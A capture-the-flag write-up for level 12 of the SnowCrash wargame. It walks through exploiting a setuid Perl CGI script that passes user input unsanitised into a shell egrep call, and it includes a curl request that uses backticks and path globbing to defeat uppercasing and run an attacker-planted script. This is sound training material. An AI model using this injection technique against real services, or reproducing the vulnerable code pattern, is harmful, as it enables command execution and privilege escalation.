# Level 12

## Vulnerability
Privilege escalation via CGI code injection

## Context
```
level12@SnowCrash:~$ ls -l
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
## Solution
Let's ```cat``` the file and see what we find. 
```
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
This program uses CGI (Common Gateway Interface) to execute a shellscript.<br/>
Here's what that would look like in a navigator:<br/>
```http://${VM_IP}:4646/?x={shellscript}<br/>```

In the program, the shellscript is evaluated in the $xx variable... which we can exploit!<br/>
The regex will capitalize the $xx argument. <br/>
So if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
Linux is case-sensitive, so it will fail to recognize a filepath in capital case. <br/>
Hmm... let's try writing our script to a file instead. 
```
level12@SnowCrash:~$ echo "getflag > /dev/shm/flag12" > /dev/shm/EXPLOIT
level12@SnowCrash:~$ cat /dev/shm/EXPLOIT
getflag > /dev/shm/flag12
```
Let's make sure we can run the script. 
```
level12@SnowCrash:~$ cd /dev/shm
level12@SnowCrash:/dev/shm$ `EXPLOIT`
EXPLOIT: command not found

level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
bash: /dev/shm/EXPLOIT: Permission denied
```
Ok, looks like it's not executable. Let's change the permissions on the file. 
```
level12@SnowCrash:/dev/shm$ chmod 755 EXPLOIT
level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
level12@SnowCrash:/dev/shm$ ls
EXPLOIT  flag12
level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```
It works! Time to leverage the perl program to execute our script.<br/>
Since we can't pass the filepath directly (it'll get capitalized by the perl program and be unrecognizable), we'll use globbing and replace the file path with asterisks.
```
level12@SnowCrash:/dev/shm$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
..
level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
Success!
